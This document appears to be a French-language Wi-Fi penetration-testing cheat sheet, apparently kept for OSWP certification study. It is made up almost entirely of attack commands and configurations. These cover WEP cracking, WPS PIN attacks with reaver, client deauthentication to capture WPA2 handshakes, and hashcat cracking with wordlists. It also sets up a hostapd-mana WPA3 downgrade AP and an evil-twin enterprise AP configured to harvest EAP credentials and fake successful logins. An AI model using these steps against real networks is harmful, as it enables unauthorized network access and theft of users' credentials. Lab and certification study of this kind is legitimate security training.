
# OPN WIFI

```
network={
  ssid="wifi-guest"
  key_mgmt=NONE
  scan_ssid=1
}
```

```
sudo wpa_supplicant -i wlan1 -c guest.conf
sudo dhclient wlan1 -v
```
# WEP

```
sudo aireplay-ng -1 3600 -q  10 -a F0:9F:C2:71:22:11 wlan1mon
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h F0:9F:C2:71:22:11 wlan1mon
sudo aircrack-ng wifi-old-01.cap
```

```
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11bb33cd55
  wep_tx_keyidx=0
}
```
# Attaque WPS

```
wash -i wlan0mon
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K # Pixie
-p # code pin vide
```

# WPA/WPA2

## Bruteforce Handshake

```
sudo airodump-ng wlan1mon --bssid F0:9F:C2:71:22:12 -w wap2.conf
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon -c 28:6C:07:6F:F9:44
aircrack-ng ~/wpa2.cap -w ~/rockyou-top100000.txt
```

# Usurper un point d'accès + WPA3

```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```

```
kali@kali:~$ cat Mostar-mana.conf
```
```
interface=wlan1
ssid=Mostar
channel=1
hw_mode=g   # g pour 2,4 GHz et a pour 5
ieee80211n=1
mana_wpaout=hostapd.hccapx
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
```

```
sudo hostapd-mana Mostar-mana.conf
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan0mon
```

```
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
hcxpcapngtool aux.pcap -o hash.22000
sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force
```
## Connection

```
network={
  ssid="wifi-wpa2"
  scan_ssid=1
  psk="PASSWORD"
  key_mgmt=WPA-PSK
}
```
```
network={
  ssid="your_ssid"
  psk="your_password"
  key_mgmt=WPA-PSK SAE
}
```
# MGT Entreprise

## Cert

```
# wireshark
(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
## Click droit --> Export packet bytes : .der
openssl x509 -inform der -in cert.der -text

# tshark
tshark -r ~/wifi/scanc44-02.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && ssl.handshake.type == 11" -V
```

## RogueAP

```
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

OU

```
sudo nano /etc/freeradius/3.0/certs/ca.cnf 
## modifier [certificat_authority]
sudo nano /etc/freeradius/3.0/certs/server.cnf 
## modifier [server]
cd /etc/freeradius/3.0/certs && rm dh
make
```

```
sudo nano :etc/hostapd-mana/mana.eap_user
```
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

```
sudo nano /etc/hostapd-mana/mana.conf
```
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

## Deauth

```
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
```

Notes : 
- si plusieurs BSSID, tous les désauthentifier
- si "alert unknown ca", attaquer un autre client

```
cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
```

## Connection

```
network={  
  ssid="wifi-corp"  
  scan_ssid=1  
  key_mgmt=WPA-EAP  
  identity="CONTOSO\juan.tr"  
  password="PASSWORD"  
  eap=PEAP  
  phase1="peaplabel=0"  
  phase2="auth=MSCHAPV2"  
}
```

```
sudo wpa_supplicant -i wlan5 -c mgt.conf
sudo dhclient wlan5
```

# AUTRES

## Modifier MAC

```
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

## Redirection SSH

```
ssh -D 9090 user@192.168.1.68
FoxyProxy : socks5 9090
```

## Fichier pcap

```
ssh user@192.168.1.68 "sudo tcpdump -i wlan2 -w -" > capture.pcap
```

## Curl

```
curl -L http://example.com
```

## Pilote

```
iw list
```

## Access point

```
iw dev <INTERFACE> scan | grep SSID:
iw dev <INTERFACE> scan | egrep "DS\ Parameter\ set|SSID"
```
## Lien

https://github.com/V0lk3n/WirelessPentesting-CheatSheet
https://zeyadazima.com/notes/oswplaybook/
https://www.emmanuelsolis.com/oswp.html